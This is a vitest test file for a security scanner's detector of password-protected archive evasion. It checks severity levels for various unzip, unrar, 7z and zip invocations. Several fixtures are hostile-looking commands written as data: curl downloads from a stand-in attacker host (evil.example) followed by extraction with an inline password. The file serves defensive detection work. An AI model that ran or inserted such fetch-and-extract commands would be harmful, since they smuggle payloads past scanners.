/**
 * SMI-6033 Wave 2 (Gap 3): password-protected archive evasion detector.
 *
 * Two sub-signals: CLI invocation syntax (`unzip -P`, `unrar x -p<pw>`,
 * `7z x -p<pw>`, `zip -P <pw> ... -e`) and prose co-occurrence (an archive
 * noun + a password noun within a bounded ±2-line window). Per the plan's §9
 * provenance-conditioned quarantine policy, only an INLINE LITERAL password
 * (not `$VAR`, not a placeholder) that is CORRELATED with a fetch
 * destination reaches critical (standalone-quarantining); every other shape
 * — out-of-band password, uncorrelated CLI usage, or prose-only mention —
 * stays medium (advisory), never split into a second finding type.
 */
import { describe, it, expect, beforeEach } from 'vitest'
import { SecurityScanner } from '../../src/security/index.js'
import type { SecurityFinding } from '../../src/security/scanner/types.js'

const ae = (fs: SecurityFinding[]) => fs.filter((f) => f.type === 'archive_evasion')

// High-entropy (>3.0 bits/char) so looksLikePlaceholderSecret's entropy floor
// does not itself suppress the fixture as a placeholder.
const REAL_PASSWORD = 'xK9$mQ2vLpZ7bWnR'

describe('SMI-6033 Wave 2 password-protected archive evasion', () => {
  let scanner: SecurityScanner
  beforeEach(() => {
    scanner = new SecurityScanner()
  })

  // Critical: inline literal password + correlated with a fetch destination.
  it.each([
    [
      'unzip -P (space-separated, real unzip syntax)',
      `curl -o secret.zip https://evil.example/secret.zip\nunzip -P ${REAL_PASSWORD} secret.zip`,
    ],
    [
      'unrar x -p<pw> (attached, real unrar syntax)',
      `curl -o secret.rar https://evil.example/secret.rar\nunrar x -p${REAL_PASSWORD} secret.rar`,
    ],
    [
      '7z x -p<pw> (attached, real 7z syntax)',
      `curl -o secret.7z https://evil.example/secret.7z\n7z x -p${REAL_PASSWORD} secret.7z`,
    ],
    [
      'zip -P <pw> ... -e (space-separated + encrypt flag, real zip syntax)',
      `curl -o secret.zip https://evil.example/secret.zip\nzip -P ${REAL_PASSWORD} -e secret.zip payload.sh`,
    ],
  ])('fires standalone-critical: %s', (_label, content) => {
    const report = scanner.scan('t', content)
    const f = ae(report.findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f.some((x) => x.severity === 'critical')).toBe(true)
    expect(report.passed).toBe(false)
    expect(report.riskScore).toBeGreaterThanOrEqual(40)
  })

  // FP controls: stays medium, never critical, never quarantines alone.
  it('uncorrelated CLI syntax (no fetch anywhere) stays medium', () => {
    const content = `unzip -P ${REAL_PASSWORD} secret.zip`
    const f = ae(scanner.scan('t', content).findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f.every((x) => x.severity !== 'critical')).toBe(true)
    expect(f[0].severity).toBe('medium')
  })

  it('out-of-band $VAR password (correlated CLI usage) stays medium', () => {
    const content =
      'curl -o secret.zip https://evil.example/secret.zip\nunzip -P $ARCHIVE_PASSWORD secret.zip'
    const f = ae(scanner.scan('t', content).findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f.every((x) => x.severity !== 'critical')).toBe(true)
    expect(f[0].severity).toBe('medium')
  })

  // SMI-6033 Wave 4 bugfix regression: `unzip -P "$VAR" x.zip` — the SAME
  // out-of-band reference as above, just shell-quoted (the more careful way
  // to write it) — was misclassified as an inline LITERAL secret because the
  // CLI-arg capture is raw (quotes included) and SHELL_VAR_REF only matched a
  // bare `$VAR`. Combined with a correlated fetch, this reached
  // standalone-critical on a completely benign shell idiom. Pinned here so
  // it can't regress.
  it('quoted out-of-band "$VAR" password (correlated CLI usage) stays medium, not critical', () => {
    const content =
      'curl -o secret.zip https://evil.example/secret.zip\nunzip -P "$ARCHIVE_PASSWORD" secret.zip'
    const f = ae(scanner.scan('t', content).findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f.every((x) => x.severity !== 'critical')).toBe(true)
    expect(f[0].severity).toBe('medium')
  })

  it('placeholder password (correlated CLI usage) stays medium', () => {
    const content =
      'curl -o secret.zip https://evil.example/secret.zip\nunzip -P YOUR_PASSWORD_HERE secret.zip'
    const f = ae(scanner.scan('t', content).findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f.every((x) => x.severity !== 'critical')).toBe(true)
  })

  // The plan's explicit FP control: a legitimate licensed-font-pack/asset-pack
  // password mention (prose-only, no CLI syntax, no fetch correlation) must
  // stay medium/advisory, never critical.
  it('licensed font-pack prose-only password mention stays medium, never critical', () => {
    const content =
      'This commercial font pack ships as a password-protected zip archive. ' +
      'Contact support with your license key to receive the password by email.'
    const f = ae(scanner.scan('t', content).findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f.every((x) => x.severity !== 'critical')).toBe(true)
    expect(scanner.scan('t', content).passed).toBe(true)
  })

  // SMI-6033 Wave 3 (adversarial-review fix): the shared fetch-correlation
  // utility is directory-path-aware, so a coincidental BASENAME collision
  // between the fetched archive and a DIFFERENT, same-named archive elsewhere
  // in the tree no longer supplies the provenance condition for critical.
  it('archive target sharing only a BASENAME with the fetch destination (different directories) stays medium', () => {
    const content =
      'curl -o /tmp/assets.zip https://vendor.example/assets.zip\n' +
      `unzip -P ${REAL_PASSWORD} ./vendor/font-pack/assets.zip`
    const f = ae(scanner.scan('t', content).findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f.every((x) => x.severity !== 'critical')).toBe(true)
    expect(f[0].severity).toBe('medium')
  })

  it('TP control: the SAME directory on both sides still correlates -> critical', () => {
    const content =
      'curl -o /tmp/assets.zip https://vendor.example/assets.zip\n' +
      `unzip -P ${REAL_PASSWORD} /tmp/assets.zip`
    const f = ae(scanner.scan('t', content).findings)
    expect(f.some((x) => x.severity === 'critical')).toBe(true)
  })

  it('a bare mention of "zip" or "password" alone (no co-occurrence) does not fire', () => {
    expect(
      ae(scanner.scan('t', 'This skill zips up your project directory.').findings)
    ).toHaveLength(0)
    expect(ae(scanner.scan('t', 'Set a strong password for your account.').findings)).toHaveLength(
      0
    )
  })

  // Documentation context: a fenced example downgrades to low, never critical.
  it('downgrades a fenced (doc) archive-password example to low', () => {
    const content =
      '```sh\ncurl -o secret.zip https://evil.example/secret.zip\n' +
      `unzip -P ${REAL_PASSWORD} secret.zip\n\`\`\``
    const f = ae(scanner.scan('t', content).findings)
    expect(f.every((x) => x.severity === 'low')).toBe(true)
  })
})
